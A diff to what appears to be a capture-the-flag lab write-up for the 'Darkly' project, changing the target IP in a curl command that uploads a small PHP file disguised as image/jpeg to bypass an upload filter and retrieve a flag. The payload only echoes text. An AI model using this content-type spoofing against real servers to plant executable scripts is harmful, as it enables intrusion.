@@ -23,7 +23,7 @@
 echo '<?php echo "Darkly" ?>' > 05_upload_image/script.php && curl -X POST \
 -F "uploaded=@05_upload_image/script.php;type=image/jpeg" \
 -F "Upload=Upload" \
-"http://10.13.200.245/index.php?page=upload" | grep flag
+"http://10.11.200.35/index.php?page=upload" | grep flag
 ```
 
 3. The server accepts the upload because we specified `type=image/jpeg`, even though it's a PHP script
